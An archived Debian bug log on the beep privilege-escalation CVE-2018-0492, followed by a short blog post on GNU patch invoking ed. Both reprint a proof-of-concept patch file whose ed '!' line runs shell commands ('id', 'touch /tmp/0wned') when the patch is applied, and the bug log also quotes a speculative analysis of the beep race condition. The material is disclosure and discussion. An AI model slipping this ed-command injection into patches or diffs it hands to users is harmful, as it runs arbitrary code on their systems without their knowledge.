=== Content from bugs.debian.org_c3c5d492_20250125_080450.html ===

# Debian Bug report logs - #894667 beep: CVE-2018-0492

[![version graph](version.cgi?collapse=1;package=src%3Abeep;width=2;fixed=beep%2F1.3-3%2Bdeb8u1;fixed=beep%2F1.3-4%2Bdeb9u1;fixed=beep%2F1.3-5;absolute=0;height=2;found=beep%2F1.3-3)](version.cgi?absolute=0;package=src%3Abeep;collapse=1;info=1;found=beep%2F1.3-3;fixed=beep%2F1.3-3%2Bdeb8u1;fixed=beep%2F1.3-4%2Bdeb9u1;fixed=beep%2F1.3-5)

Package:
[src:beep](pkgreport.cgi?src=beep);
Maintainer for [src:beep](pkgreport.cgi?src=beep) is [Rhonda D'Vine <rhonda@debian.org>](pkgreport.cgi?maint=rhonda%40debian.org);

Reported by: [Salvatore Bonaccorso <carnil@debian.org>](pkgreport.cgi?submitter=carnil%40debian.org)

Date: Tue, 3 Apr 2018 04:45:01 UTC

Severity: *grave*

Tags: security, upstream

Found in version beep/1.3-3

Fixed in versions beep/1.3-3+deb8u1, beep/1.3-4+deb9u1, beep/1.3-5

**Done:** Rhonda D'Vine <rhonda@debian.org>

Bug is archived. No further changes may be made.

Forwarded to <https://github.com/johnath/beep/issues/11>

Display info messages

View this report as an [mbox folder](bugreport.cgi?bug=894667;mbox=yes), [status mbox](bugreport.cgi?bug=894667;mbox=yes;mboxstatus=yes), [maintainer mbox](bugreport.cgi?bug=894667;mbox=yes;mboxmaint=yes)

---

**Report forwarded**
to `debian-bugs-dist@lists.debian.org, carnil@debian.org, team@security.debian.org, team@security.debian.org, Rhonda D'Vine <rhonda@debian.org>`:

`Bug#894667`; Package `src:beep`.
(Tue, 03 Apr 2018 04:45:04 GMT) ([full text](bugreport.cgi?bug=894667;msg=2), [mbox](bugreport.cgi?bug=894667;mbox=yes;msg=2), [link](#1)).

---

**Acknowledgement sent**
to `Salvatore Bonaccorso <carnil@debian.org>`:

New Bug report received and forwarded. Copy sent to `carnil@debian.org, team@security.debian.org, team@security.debian.org, Rhonda D'Vine <rhonda@debian.org>`.
(Tue, 03 Apr 2018 04:45:04 GMT) ([full text](bugreport.cgi?bug=894667;msg=4), [mbox](bugreport.cgi?bug=894667;mbox=yes;msg=4), [link](#3)).

---

[Message #5](#5) received at submit@bugs.debian.org ([full text](bugreport.cgi?bug=894667;msg=5), [mbox](bugreport.cgi?bug=894667;mbox=yes;msg=5), reply):

![](/cgi-bin/libravatar.cgi?email=carnil%40debian.org)
From: Salvatore Bonaccorso <carnil@debian.org>
To: Debian Bug Tracking System <submit@bugs.debian.org>
Subject: beep: CVE-2018-0492
Date: Tue, 03 Apr 2018 06:40:18 +0200
```
Source: beep
Version: 1.3-3
Severity: grave
Tags: security upstream
Justification: user security hole
Control: fixed -1 1.3-4+deb9u1
Control: fixed -1 1.3-3+deb8u1

Hi,

The following vulnerability was published for beep:

[CVE-2018-0492](https://security-tracker.debian.org/tracker/CVE-2018-0492)[0]:
local privilege escalation

If you fix the vulnerability please also make sure to include the
CVE (Common Vulnerabilities & Exposures) id in your changelog entry.

For further information see:

[0] <https://security-tracker.debian.org/tracker/CVE-2018-0492>
    <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0492>

Regards,
Salvatore

```

---

**Marked as fixed in versions beep/1.3-4+deb9u1.**
Request was from `Salvatore Bonaccorso <carnil@debian.org>`
to `submit@bugs.debian.org`.
(Tue, 03 Apr 2018 04:45:04 GMT) ([full text](bugreport.cgi?bug=894667;msg=7), [mbox](bugreport.cgi?bug=894667;mbox=yes;msg=7), [link](#6)).

---

**Marked as fixed in versions beep/1.3-3+deb8u1.**
Request was from `Salvatore Bonaccorso <carnil@debian.org>`
to `submit@bugs.debian.org`.
(Tue, 03 Apr 2018 04:45:04 GMT) ([full text](bugreport.cgi?bug=894667;msg=9), [mbox](bugreport.cgi?bug=894667;mbox=yes;msg=9), [link](#8)).

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Rhonda D'Vine <rhonda@debian.org>`:

`Bug#894667`; Package `src:beep`.
(Wed, 04 Apr 2018 23:15:02 GMT) ([full text](bugreport.cgi?bug=894667;msg=11), [mbox](bugreport.cgi?bug=894667;mbox=yes;msg=11), [link](#10)).

---

**Acknowledgement sent**
to `rain1@airmail.cc`:

Extra info received and forwarded to list. Copy sent to `Rhonda D'Vine <rhonda@debian.org>`.
(Wed, 04 Apr 2018 23:15:02 GMT) ([full text](bugreport.cgi?bug=894667;msg=13), [mbox](bugreport.cgi?bug=894667;mbox=yes;msg=13), [link](#12)).

---

[Message #14](#14) received at 894667@bugs.debian.org ([full text](bugreport.cgi?bug=894667;msg=14), [mbox](bugreport.cgi?bug=894667;mbox=yes;msg=14), reply):

![](/cgi-bin/libravatar.cgi?email=rain1%40airmail.cc)
From: rain1@airmail.cc
To: 894667@bugs.debian.org
Subject: beep bug
Date: Thu, 05 Apr 2018 00:02:23 +0100
```
Hello.

After analysis of the diff it in unclear what exactly the race condition
bug is and how it would constitute a privileged escalation.

Please could somebody provide an explanation of what the race condition
is, and how it is a security issue rather than just being a regular bug.
so we can understand why the patch fixes it.

It seems that open/closing the console_device (set with -e) was done
repeatedly in the -n case. It's possible that the race in question would
be triggered if a SIGINT or SIGTERM was sent at the right time (which
time)? possibly causing a double free. As the beep program just performs
ioctl or writes a very simple struct to an fd it does not seem there is
enough attacker control to actually do any sort of code execution with
beep.

So this may not really be a security issue, just a minor improvement in
the code. I welcome being corrected though.

(Note: we have looked at the satire website about the bug
<https://holeybeep.ninja> and it does not provide any technical details of
interest)

Cheers!

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Rhonda D'Vine <rhonda@debian.org>`:

`Bug#894667`; Package `src:beep`.
(Thu, 05 Apr 2018 09:24:02 GMT) ([full text](bugreport.cgi?bug=894667;msg=16), [mbox](bugreport.cgi?bug=894667;mbox=yes;msg=16), [link](#15)).

---

**Acknowledgement sent**
to `Kristian Köhntopp <kris@koehntopp.de>`:

Extra info received and forwarded to list. Copy sent to `Rhonda D'Vine <rhonda@debian.org>`.
(Thu, 05 Apr 2018 09:24:03 GMT) ([full text](bugreport.cgi?bug=894667;msg=18), [mbox](bugreport.cgi?bug=894667;mbox=yes;msg=18), [link](#17)).

---

[Message #19](#19) received at 894667@bugs.debian.org ([full text](bugreport.cgi?bug=894667;msg=19), [mbox](bugreport.cgi?bug=894667;mbox=yes;msg=19), reply):

![](/cgi-bin/libravatar.cgi?email=kris%40koehntopp.de)
From: Kristian Köhntopp <kris@koehntopp.de>
To: 894667@bugs.debian.org
Subject: The patch is the exploit.
Date: Thu, 5 Apr 2018 10:33:40 +0200
```

The <https://holeybeep.ninja/> website contains a patch <https://holeybeep.ninja/beep.patch>.

The patch contains a line starting with a !.

That’s the actual bug, and it’s in the patch program.

<http://git.savannah.gnu.org/cgit/patch.git/tree/src/pch.c#n2383>

--- /dev/null	2018-13-37 13:37:37.000000000 +0100
+++ b/beep.c	2018-13-37 13:38:38.000000000 +0100
1337a
1,112d
!id>~/pwn.lol;beep # 13-21 12:53:21.000000000 +0100
.
  -- <https://holeybeep.ninja/beep.patch>

patch calls ed. Ed calls sh. Arbitrary command execution through unreviewed patches.

Does git call patch or implement patch-parsing by itself?

K

--
Kristian Köhntopp [http://google.com/+KristianKohntopp](http://google.com/%2BKristianKohntopp)

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Rhonda D'Vine <rhonda@debian.org>`:

`Bug#894667`; Package `src:beep`.
(Thu, 05 Apr 2018 17:24:03 GMT) ([full text](bugreport.cgi?bug=894667;msg=21), [mbox](bugreport.cgi?bug=894667;mbox=yes;msg=21), [link](#20)).

---

**Acknowledgement sent**
to `Anthony DeRobertis <anthony@derobert.net>`:

Extra info received and forwarded to list. Copy sent to `Rhonda D'Vine <rhonda@debian.org>`.
(Thu, 05 Apr 2018 17:24:03 GMT) ([full text](bugreport.cgi?bug=894667;msg=23), [mbox](bugreport.cgi?bug=894667;mbox=yes;msg=23), [link](#22)).

---

[Message #24](#24) received at 894667@bugs.debian.org ([full text](bugreport.cgi?bug=894667;msg=24), [mbox](bugreport.cgi?bug=894667;mbox=yes;msg=24), reply):

![](/cgi-bin/libravatar.cgi?email=anthony%40derobert.net)
From: Anthony DeRobertis <anthony@derobert.net>
To: 894667@bugs.debian.org
Subject: Explanation of the beep vulnerability found on the 'net.
Date: Thu, 5 Apr 2018 12:40:23 -0400
```
An explanation of the exploit (not by me) is at
<<https://news.ycombinator.com/item?id=16762794>>:

    My speculation on the race condition fixed in the patch:

	The while loop in `main` calls `play_beep` multiple times. Each call
	to `play_beep` opens the `--device` and sets the global
	`console_fd`, and then sets the global `console_type` based on the
	`ioctl(EVIOCGSND)` error, before calling `do_beep`.

	This normally prevents the user from writing to arbitrary files with
	`--device`, because without the `ioctl(EVIOCGSND)` succeeding,
	`do_beep` with `BEEP_TYPE_CONSOLE` only does a (harmless?)
	`ioctl(KIOCSOUND)`, not a `write` with the `struct input_event`.
	However, the signal handler calls `do_beep` directly using the
	globals set by `play_beep`...

	So I image that with something along the lines of `beep
	--device=./symlink-to-tty ... --new ...`, you can rewrite the
	symlink to point to an arbitrary file during the first `play_beep`,
	and then race the open/ioctl in the second `play_beep` with the
	signal handler such that `do_beep` gets called with `console_fd`
	pointing to your arbitrary file, and with `console_type` still set
	to `BEEP_TYPE_EVDEV`, resulting in a `write` to your arbitrary file.

	Exploiting that for privesc would require control over the `struct
	input_event` for the `write`... `handle_signal` calls `do_beep` with
	a fixed `freq` of 0, so all of the initialized fields are set to
	fixed values... However, there's an unitialized `struct timeval` at
	the beginning of the `struct input_event`, and it's allocated on the
	stack...

	Seems like a curious security vulnerability, I'll assume the debian
	security team must have a working PoC in order to actually call it
	out as a local privesc vulnerability... I'd love to see the actual
	PoC eventually :)

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Rhonda D'Vine <rhonda@debian.org>`:

`Bug#894667`; Package `src:beep`.
(Thu, 05 Apr 2018 19:21:03 GMT) ([full text](bugreport.cgi?bug=894667;msg=26), [mbox](bugreport.cgi?bug=894667;mbox=yes;msg=26), [link](#25)).

---

**Acknowledgement sent**
to `Tony Hoyle <tony@hoyle.me.uk>`:

Extra info received and forwarded to list. Copy sent to `Rhonda D'Vine <rhonda@debian.org>`.
(Thu, 05 Apr 2018 19:21:03 GMT) ([full text](bugreport.cgi?bug=894667;msg=28), [mbox](bugreport.cgi?bug=894667;mbox=yes;msg=28), [link](#27)).

---

[Message #29](#29) received at 894667@bugs.debian.org ([full text](bugreport.cgi?bug=894667;msg=29), [mbox](bugreport.cgi?bug=894667;mbox=yes;msg=29), reply):

![](/cgi-bin/libravatar.cgi?email=tony%40hoyle.me.uk)
From: Tony Hoyle <tony@hoyle.me.uk>
To: 894667@bugs.debian.org
Subject: beep: CVE-2018-0492
Date: Thu, 5 Apr 2018 20:17:32 +0100
```
The patch vulnerability seems more severe to me, as people apply patches
all the time (they shouldn't do it as root, but people are people).

It's concerning that the holeybeep.ninja site exploited an unrelated
fault for 'fun' without apparently telling anyone.

Tony

```

---

**Set Bug forwarded-to-address to '<https://github.com/johnath/beep/issues/11>'.**
Request was from `Jakub Wilk <jwilk@jwilk.net>`
to `control@bugs.debian.org`.
(Thu, 05 Apr 2018 19:30:03 GMT) ([full text](bugreport.cgi?bug=894667;msg=31), [mbox](bugreport.cgi?bug=894667;mbox=yes;msg=31), [link](#30)).

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Rhonda D'Vine <rhonda@debian.org>`:

`Bug#894667`; Package `src:beep`.
(Thu, 05 Apr 2018 20:54:03 GMT) ([full text](bugreport.cgi?bug=894667;msg=33), [mbox](bugreport.cgi?bug=894667;mbox=yes;msg=33), [link](#32)).

---

**Acknowledgement sent**
to `Anders Kaseorg <andersk@mit.edu>`:

Extra info received and forwarded to list. Copy sent to `Rhonda D'Vine <rhonda@debian.org>`.
(Thu, 05 Apr 2018 20:54:03 GMT) ([full text](bugreport.cgi?bug=894667;msg=35), [mbox](bugreport.cgi?bug=894667;mbox=yes;msg=35), [link](#34)).

---

[Message #36](#36) received at 894667@bugs.debian.org ([full text](bugreport.cgi?bug=894667;msg=36), [mbox](bugreport.cgi?bug=894667;mbox=yes;msg=36), reply):

![](/cgi-bin/libravatar.cgi?email=andersk%40mit.edu)
From: Anders Kaseorg <andersk@mit.edu>
To: Tony Hoyle <tony@hoyle.me.uk>, 894667@bugs.debian.org
Cc: "Rhonda D'Vine" <rhonda@debian.org>
Subject: Re: Bug#894667: beep: CVE-2018-0492
Date: Thu, 5 Apr 2018 16:46:05 -0400 (EDT)
```
On Thu, 5 Apr 2018, Tony Hoyle wrote:
> It's concerning that the holeybeep.ninja site exploited an unrelated
> fault for 'fun' without apparently telling anyone.

To be fair, they told you exactly what was going to happen: “Apply this
[patch] as soon as possible using the following command: patch -p1 <
beep.diff. A short beep should be heard if all hunks are applied
successfully.”

Anders

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Rhonda D'Vine <rhonda@debian.org>`:

`Bug#894667`; Package `src:beep`.
(Thu, 05 Apr 2018 22:27:03 GMT) ([full text](bugreport.cgi?bug=894667;msg=38), [mbox](bugreport.cgi?bug=894667;mbox=yes;msg=38), [link](#37)).

---

**Acknowledgement sent**
to `Rhonda D'Vine <rhonda@deb.at>`:

Extra info received and forwarded to list. Copy sent to `Rhonda D'Vine <rhonda@debian.org>`.
(Thu, 05 Apr 2018 22:27:03 GMT) ([full text](bugreport.cgi?bug=894667;msg=40), [mbox](bugreport.cgi?bug=894667;mbox=yes;msg=40), [link](#39)).

---

[Message #41](#41) received at 894667@bugs.debian.org ([full text](bugreport.cgi?bug=894667;msg=41), [mbox](bugreport.cgi?bug=894667;mbox=yes;msg=41), reply):

![](/cgi-bin/libravatar.cgi?email=rhonda%40deb.at)
From: Rhonda D'Vine <rhonda@deb.at>
To: Anders Kaseorg <andersk@mit.edu>,Tony Hoyle <tony@hoyle.me.uk>,894667@bugs.debian.org
Cc: Rhonda D'Vine <rhonda@debian.org>
Subject: Re: Bug#894667: beep: CVE-2018-0492
Date: Fri, 06 Apr 2018 00:18:55 +0200
```
 So people are falling for a fake page that is not even well disguised, apply a patch from there and now worry about being exploited?  Call me unimpressed, but what is expected to be done about that?

 Please, only get your patches through trusted sources, not from windy websites that just look shiny on the surface. I can just say well played, holeybeep people.

 Enjoy,
Rhonda

Am 5. April 2018 22:46:05 MESZ schrieb Anders Kaseorg <andersk@mit.edu>:
>On Thu, 5 Apr 2018, Tony Hoyle wrote:
>> It's concerning that the holeybeep.ninja site exploited an unrelated
>> fault for 'fun' without apparently telling anyone.
>
>To be fair, they told you exactly what was going to happen: “Apply this
>
>[patch] as soon as possible using the following command: patch -p1 <
>beep.diff. A short beep should be heard if all hunks are applied
>successfully.”
>
>Anders

--
Diese Nachricht wurde von meinem Android-Mobiltelefon mit K-9 Mail gesendet.

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Rhonda D'Vine <rhonda@debian.org>`:

`Bug#894667`; Package `src:beep`.
(Fri, 06 Apr 2018 15:21:03 GMT) ([full text](bugreport.cgi?bug=894667;msg=43), [mbox](bugreport.cgi?bug=894667;mbox=yes;msg=43), [link](#42)).

---

**Acknowledgement sent**
to `Richard Kettlewell <rjk@terraraq.uk>`:

Extra info received and forwarded to list. Copy sent to `Rhonda D'Vine <rhonda@debian.org>`.
(Fri, 06 Apr 2018 15:21:03 GMT) ([full text](bugreport.cgi?bug=894667;msg=45), [mbox](bugreport.cgi?bug=894667;mbox=yes;msg=45), [link](#44)).

---

[Message #46](#46) received at 894667@bugs.debian.org ([full text](bugreport.cgi?bug=894667;msg=46), [mbox](bugreport.cgi?bug=894667;mbox=yes;msg=46), reply):

![](/cgi-bin/libravatar.cgi?email=rjk%40terraraq.uk)
From: Richard Kettlewell <rjk@terraraq.uk>
To: 894667@bugs.debian.org
Cc: security@debian.org
Subject: beep, #894667 and information leakage
Date: Fri, 6 Apr 2018 15:44:51 +0100
```
Hi,

There's an additional issue, which is that the ability to open arbitrary
caller-chosen files represents at least an information leak, and maybe
more serious. See the comments starting at:
<https://github.com/johnath/beep/issues/11#issuecomment-379215473>

ttfn/rjk

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Rhonda D'Vine <rhonda@debian.org>`:

`Bug#894667`; Package `src:beep`.
(Sat, 07 Apr 2018 06:45:03 GMT) ([full text](bugreport.cgi?bug=894667;msg=48), [mbox](bugreport.cgi?bug=894667;mbox=yes;msg=48), [link](#47)).

---

**Acknowledgement sent**
to `Salvatore Bonaccorso <carnil@debian.org>`:

Extra info received and forwarded to list. Copy sent to `Rhonda D'Vine <rhonda@debian.org>`.
(Sat, 07 Apr 2018 06:45:03 GMT) ([full text](bugreport.cgi?bug=894667;msg=50), [mbox](bugreport.cgi?bug=894667;mbox=yes;msg=50), [link](#49)).

---

[Message #51](#51) received at 894667@bugs.debian.org ([full text](bugreport.cgi?bug=894667;msg=51), [mbox](bugreport.cgi?bug=894667;mbox=yes;msg=51), reply):

![](/cgi-bin/libravatar.cgi?email=carnil%40debian.org)
From: Salvatore Bonaccorso <carnil@debian.org>
To: Richard Kettlewell <rjk@terraraq.uk>, 894667@bugs.debian.org
Cc: security@debian.org
Subject: Re: Bug#894667: beep, #894667 and information leakage
Date: Sat, 7 Apr 2018 08:40:49 +0200
```
Hi Richard,

On Fri, Apr 06, 2018 at 03:44:51PM +0100, Richard Kettlewell wrote:
> Hi,
>
> There's an additional issue, which is that the ability to open arbitrary
> caller-chosen files represents at least an information leak, and maybe
> more serious. See the comments starting at:
> <https://github.com/johnath/beep/issues/11#issuecomment-379215473>

Can you fill a new issue for this in the Debian BTS (and prefably
independly from issues/11 upstream) to keep those seprated?

Regards,
Salvatore

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Rhonda D'Vine <rhonda@debian.org>`:

`Bug#894667`; Package `src:beep`.
(Sat, 07 Apr 2018 08:24:03 GMT) ([full text](bugreport.cgi?bug=894667;msg=53), [mbox](bugreport.cgi?bug=894667;mbox=yes;msg=53), [link](#52)).

---

**Acknowledgement sent**
to `Richard Kettlewell <rjk@terraraq.uk>`:

Extra info received and forwarded to list. Copy sent to `Rhonda D'Vine <rhonda@debian.org>`.
(Sat, 07 Apr 2018 08:24:03 GMT) ([full text](bugreport.cgi?bug=894667;msg=55), [mbox](bugreport.cgi?bug=894667;mbox=yes;msg=55), [link](#54)).

---

[Message #56](#56) received at 894667@bugs.debian.org ([full text](bugreport.cgi?bug=894667;msg=56), [mbox](bugreport.cgi?bug=894667;mbox=yes;msg=56), reply):

![](/cgi-bin/libravatar.cgi?email=rjk%40terraraq.uk)
From: Richard Kettlewell <rjk@terraraq.uk>
To: Salvatore Bonaccorso <carnil@debian.org>, 894667@bugs.debian.org
Cc: security@debian.org
Subject: Re: Bug#894667: beep, #894667 and information leakage
Date: Sat, 7 Apr 2018 09:19:58 +0100
```
On 2018-04-07 07:40, Salvatore Bonaccorso wrote:
> Hi Richard,
>
> On Fri, Apr 06, 2018 at 03:44:51PM +0100, Richard Kettlewell wrote:
>> Hi,
>>
>> There's an additional issue, which is that the ability to open arbitrary
>> caller-chosen files represents at least an information leak, and maybe
>> more serious. See the comments starting at:
>> <https://github.com/johnath/beep/issues/11#issuecomment-379215473>
>
> Can you fill a new issue for this in the Debian BTS (and prefably
> independly from issues/11 upstream) to keep those seprated?

<https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=895115>

ttfn/rjk

```

---

**Added tag(s) pending.**
Request was from `Rhonda D'Vine <rhonda@macroburst.deb.at>`
to `control@bugs.debian.org`.
(Thu, 26 Apr 2018 17:57:10 GMT) ([full text](bugreport.cgi?bug=894667;msg=58), [mbox](bugreport.cgi?bug=894667;mbox=yes;msg=58), [link](#57)).

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Rhonda D'Vine <rhonda@debian.org>`:

`Bug#894667`; Package `src:beep`.
(Thu, 26 Apr 2018 19:15:03 GMT) ([full text](bugreport.cgi?bug=894667;msg=60), [mbox](bugreport.cgi?bug=894667;mbox=yes;msg=60), [link](#59)).

---

**Acknowledgement sent**
to `"Neal P. Murphy" <neal.p.murphy@alum.wpi.edu>`:

Extra info received and forwarded to list. Copy sent to `Rhonda D'Vine <rhonda@debian.org>`.
(Thu, 26 Apr 2018 19:15:03 GMT) ([full text](bugreport.cgi?bug=894667;msg=62), [mbox](bugreport.cgi?bug=894667;mbox=yes;msg=62), [link](#61)).

---

[Message #63](#63) received at 894667@bugs.debian.org ([full text](bugreport.cgi?bug=894667;msg=63), [mbox](bugreport.cgi?bug=894667;mbox=yes;msg=63), reply):

![](/cgi-bin/libravatar.cgi?email=neal.p.murphy%40alum.wpi.edu)
From: "Neal P. Murphy" <neal.p.murphy@alum.wpi.edu>
To: 894667@bugs.debian.org
Subject: beep bug
Date: Thu, 26 Apr 2018 14:57:58 -0400
```
How similar is beep to beep2? I use beep2 on Smoothwall Express. It is not installed suid root. Rather, I changed beep2's default output device to /dev/tty13 (would be just as easy to use tty63) and changed the perms on that TTY to 622. Without suid root, beep2 can only open files for input or output for which its user has access; with similar treatment, beep should be almost properly limited.

Neal

```

---

**Reply sent**
to `Rhonda D'Vine <rhonda@debian.org>`:

You have taken responsibility.
(Thu, 26 Apr 2018 20:21:11 GMT) ([full text](bugreport.cgi?bug=894667;msg=65), [mbox](bugreport.cgi?bug=894667;mbox=yes;msg=65), [link](#64)).

---

**Notification sent**
to `Salvatore Bonaccorso <carnil@debian.org>`:

Bug acknowledged by developer.
(Thu, 26 Apr 2018 20:21:11 GMT) ([full text](bugreport.cgi?bug=894667;msg=67), [mbox](bugreport.cgi?bug=894667;mbox=yes;msg=67), [link](#66)).

---

[Message #68](#68) received at 894667-close@bugs.debian.org ([full text](bugreport.cgi?bug=894667;msg=68), [mbox](bugreport.cgi?bug=894667;mbox=yes;msg=68), reply):

![](/cgi-bin/libravatar.cgi?email=rhonda%40debian.org)
From: Rhonda D'Vine <rhonda@debian.org>
To: 894667-close@bugs.debian.org
Subject: Bug#894667: fixed in beep 1.3-5
Date: Thu, 26 Apr 2018 20:19:45 +0000
```
Source: beep
Source-Version: 1.3-5

We believe that the bug you reported is fixed in the latest version of
beep, which is due to be installed in the Debian FTP archive.

A summary of the changes between this version and the previous one is
attached.

Thank you for reporting the bug, which will now be closed.  If you
have further comments please address them to 894667@bugs.debian.org,
and the maintainer will reopen the bug report if appropriate.

Debian distribution maintenance software
pp.
Rhonda D'Vine <rhonda@debian.org> (supplier of updated beep package)

(This message was generated automatically at their request; if you
believe that there is a problem with it please contact the archive
administrators by mailing ftpmaster@ftp-master.debian.org)

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

Format: 1.8
Date: Thu, 26 Apr 2018 18:08:11 +0200
Source: beep
Binary: beep beep-udeb
Architecture: source amd64
Version: 1.3-5
Distribution: unstable
Urgency: high
Maintainer: Rhonda D'Vine <rhonda@debian.org>
Changed-By: Rhonda D'Vine <rhonda@debian.org>
Description:
 beep       - advanced PC-speaker beeper
 beep-udeb  - advanced PC-speaker beeper - minimal package (udeb)
Closes: [630161](bugreport.cgi?bug=630161) [745163](bugreport.cgi?bug=745163) [812144](bugreport.cgi?bug=812144) [894667](bugreport.cgi?bug=894667)
Changes:
 beep (1.3-5) unstable; urgency=high
 .
   * Rewrite debian/copyright in DEP-5 format, and relicense the packaging
     under MIT to make it clear for lawyers, too.
   * [CVE-2018-0492](https://security-tracker.debian.org/tracker/CVE-2018-0492): Fix a local privilege escalation vulnerability.
     (closes: #[894667](bugreport.cgi?bug=894667))
   * Bump Standards-Version to 4.1.4.
   * Switch Architecture to linux-any (closes: #[745163](bugreport.cgi?bug=745163))
   * Fix group permission of beep (closes: #[812144](bugreport.cgi?bug=812144))
   * Add package description suggestions (closes: #[630161](bugreport.cgi?bug=630161))
Checksums-Sha1:
 9b82eb78167afbcb951064b0c05d84560b8132a3 1820 beep_1.3-5.dsc
 68026dbe830539fdaab4712b3edaaa054f64c779 20548 beep_1.3-5.debian.tar.xz
 669f0866fd91ccead12508d896bceabf280893f2 7104 beep-dbgsym_1.3-5_amd64.deb
 fa0f1d997464be37614267926ebf5a9d79f8c976 4732 beep-udeb_1.3-5_amd64.udeb
 dd0902b1207fe4b6c66c00fdcc9ce7f87fce6207 5873 beep_1.3-5_amd64.buildinfo
 aaebf22f34bd72e096f7221be80bfbd0ea44781f 26364 beep_1.3-5_amd64.deb
Checksums-Sha256:
 36626fb831f101d9cd312a18dadce9bf7bf61a1b46ea376f0b946f0804fce1c9 1820 beep_1.3-5.dsc
 7105ff192c0c76ab7653f43bd98fc085a4452fdebe3267c823cf9627a5d094b5 20548 beep_1.3-5.debian.tar.xz
 0692ce888275abbf6abba693fc0aa2f2b8faebf1fb7f14910bd1c649991db833 7104 beep-dbgsym_1.3-5_amd64.deb
 2cc1ecf3dcebe56b9e13d96dc357073386ca76f19447220e90c34fee88ad8a9e 4732 beep-udeb_1.3-5_amd64.udeb
 61ca6ed777ba8e183217c1d237a1a1911ce3289074334a9fb5866b6c639f9061 5873 beep_1.3-5_amd64.buildinfo
 dbe27befd9fd7a355130fe45d77a1cb76f57dd4219dc502035ba7a9ddde29121 26364 beep_1.3-5_amd64.deb
Files:
 be8a5ae2405c8d26057b28d86f73bd33 1820 sound optional beep_1.3-5.dsc
 d236d027849ab6050dd00843122331c6 20548 sound optional beep_1.3-5.debian.tar.xz
 44d1b198b2ac8153e642c51cc2ddc48d 7104 debug optional beep-dbgsym_1.3-5_amd64.deb
 c33902637b8addb285779a0434888aa1 4732 debian-installer optional beep-udeb_1.3-5_amd64.udeb
 81f50228d50b249562d85e3cded04f64 5873 sound optional beep_1.3-5_amd64.buildinfo
 93d90a7570ebd70c1e48abaed823025d 26364 sound optional beep_1.3-5_amd64.deb

-----BEGIN PGP SIGNATURE-----

iQIzBAEBCAAdFiEELHLzKO0XByBPs0mU3ugEPuF+uzAFAlriDuAACgkQ3ugEPuF+
uzCzjg/8C303ZQzfyBZnh/dtb5eUDFvncFZ5z+6HP9WMzC7W5B3+PRXsAAXCDMTX
fFG3jnGE7Vc+yzaNzEmiX+ufhw3gUgp7lITr+nJhz9xXElFCoYjl2TDy/LutRuRF
1lZcqeQgicPtc3Oq6R8pV1psus8ol86hKJ7E8Yt4XzOYyP7N8LJKEYL8VsNCY7Na
9d6hC+FS5hxBlJbcJ9MzmgBxmEGDL0G8M09qfZtAQyrvavc+cj0cWqZ5KNgltsE+
cDl/yj46EKdidyqsWRBmsF4gHDf/qTZFoBhtGn3tj18A/ONP7YSnpgdPbJAL5Hhz
cc93H2GbAR3osap4dMLmYKrtAj2vG/OCYFr4jUsDzrjnFNJ8hvh2Cx9jr1umgEko
Sq09KnnK4r6iI++LVA2/jD8BkJPNRa0QfJXCUPqocP8HJuduJlFhgMcDXH6lrUly
x5nvUvGqKLA4MT8Nt/jLykwGNLUHu27fzeLVjw0VGz7Ni96kKSqh9O9mYWVknH0+
jk8FIhcsu54PLKfKaJjzCb66pqSfRwCw50cg4Y3mw4+6Itf1WzEr0Bu7+fEmfD4R
5rbMSh6ldiO0SiSl6V/XBu0LaImIe5ZHTQ1KDZpBhnGWCJv57+uk3fEabTS8HfJG
OcsiPKYgkQTe5t4Pa3Faa7wdr8z3tKK7uSeyL2LqdXk5IZ7bu4I=
=kBts
-----END PGP SIGNATURE-----

```

---

**Bug archived.**
Request was from `Debbugs Internal Request <owner@bugs.debian.org>`
to `internal_control@bugs.debian.org`.
(Sun, 15 Jul 2018 07:31:25 GMT) ([full text](bugreport.cgi?bug=894667;msg=70), [mbox](bugreport.cgi?bug=894667;mbox=yes;msg=70), [link](#69)).

---

Send a report that [this bug log contains spam](https://bugs.debian.org/cgi-bin/bugspam.cgi?bug=894667).

---

Debian bug tracking system administrator <owner@bugs.debian.org>.
Last modified:
Sat Jan 25 08:04:50 2025;
Machine Name:
buxtehude

[Debian Bug tracking system](https://www.debian.org/Bugs/)

Debbugs is free software and licensed under the terms of the GNU General
Public License version 2. The current version can be obtained
from <https://bugs.debian.org/debbugs-source/>.

Copyright © 1999 Darren O. Benham,
1997,2003 nCipher Corporation Ltd,
1994-97 Ian Jackson,
2005-2017 Don Armstrong, and many other contributors.



=== Content from rachelbythebay.com_1b2a83ac_20250125_080448.html ===

# [Writing](/w/)

[![Feed](/w/feed.png)](/w/feed/)
Software, technology, sysadmin war stories, and more.

Thursday, April 5, 2018
## patch runs ed, and ed can run anything

Okay, this is kind of awesome, if you like watching the world burn.

The short version is: patch runs ed... and ed can run arbitrary
commands, including when it's called from patch.

Check this out. I've taken the proof of concept and changed it
slightly:

```

$ cat evil.patch
--- /dev/null   2018-13-37 13:37:37.000000000 +0100
+++ b/beep.c    2018-13-37 13:38:38.000000000 +0100
1337a
1,112d
!touch /tmp/0wned; ls -la /tmp/0wned
.
$ patch < evil.patch
?
?
-rw-r--r-- 1 edu users 0 Apr  5 10:42 /tmp/0wned
?
patch: **** /usr/bin/ed FAILED
$

```

This came up as part of the discussion on the "beep exploit" yesterday.
I found it buried in the HN /new queue as a simple
[link to the Debian bug tracker.](https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=894667#19)

This seems far too good to leave hidden in there.

Subprocesses, am I right?

Late update: it looks like FreeBSD
[fixed this same sort of thing](https://www.freebsd.org/security/advisories/FreeBSD-SA-15%3A18.bsdpatch.asc)
in 2015. GNU patch, however (shown above), clearly has not.

Another update: OpenBSD also
[patched it](https://ftp.openbsd.org/pub/OpenBSD/patches/5.7/common/013_patch.patch.sig)
in 2015. It looks like they had it first, which I suppose makes sense.
